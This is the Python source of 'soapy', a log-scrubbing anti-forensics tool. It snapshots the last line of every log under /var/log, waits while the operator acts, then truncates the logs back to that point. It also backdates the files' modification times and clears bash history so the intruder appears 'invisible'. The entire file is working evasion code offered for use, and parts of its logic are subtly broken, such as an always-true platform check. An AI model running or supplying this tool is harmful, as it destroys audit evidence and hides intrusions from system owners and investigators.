import os
import sys
import time
import argparse
import platform


__version__ = "0.1"
__author__ = "Ekultek"
__progname__ = "soapy"
__twitter__ = "@stay__salty"


class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        parser.add_argument("-l", "--log", dest="logPath", metavar="PATH", help="pass the path to log files")
        return parser.parse_args()


def needs_history_cleared():
    if "linux" or "darwin" in str(platform.platform()).lower():
        print("clearing bash history")
        os.system("history -c && history -w")


def current_end_log(log_root_path):
    """
    find the current last lines on the log files
    these will be used as reference later to scrub the logs
    """
    def tails(file_object, last_lines):
        """
        mimics the tail command
        """
        with open(file_object) as file_object:
            assert last_lines >= 0
            pos, lines = last_lines + 1, []
            while len(lines) <= last_lines:
                try:
                    file_object.seek(-pos, 2)
                except IOError:
                    file_object.seek(0)
                    break
                finally:
                    lines = list(file_object)
                pos *= 2
        return "".join(lines[-last_lines:])

    filenames = []
    log_data = []

    for root, subs, files in os.walk(log_root_path):
        for name in files:
            filenames.append(os.path.join(root, name))
    for f in filenames:
        log_data.append((f, tails(f, 1)))
    return log_data


def edit_logs(path, identifier, time_change):
    """
    edit the log files back to their previous state and
    change the edit times so that it seems like you weren't
    even there
    """
    with open(path) as log:
        data = log.read()
        index_of_action = data.find(identifier)
        scrubbed = data[0:index_of_action]
    with open(path, "w") as log:
        log.write(scrubbed)
        os.utime(path, (time_change, time_change))


def main():
    """
    main function
    """
    print("extracting pointers from logs")
    opt = Parser().optparse()
    if opt.logPath is None:
        print("no path provided defaulting to /var/log")
        path = "/var/log"
    else:
        path = opt.logPath
    current_time = time.time()
    current_last_lines = current_end_log(path)
    i = 1
    print(
        "logs are being monitored, continue what you're doing and we'll wait, press "
        "CNTRL-C when you're ready to clean the logs"
    )
    try:
        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            time.sleep(1)
            i += 1
    except KeyboardInterrupt:
        print("\n")
        print("fixing log files")
        for item in current_last_lines:
            edit_logs(item[0], item[1], current_time)
        needs_history_cleared()
    print("done! you're invisible, you where in for {} second(s)".format(i))


if __name__ == "__main__":
    sep = "-" * 30
    print(
        "\n{}\nProgram: {}\nVersion: {}\nAuthor: {}\nTwitter: {}\n{}\n".format(
            sep,
            __progname__,
            __version__,
            __author__,
            __twitter__,
            sep
        )
    )

    main()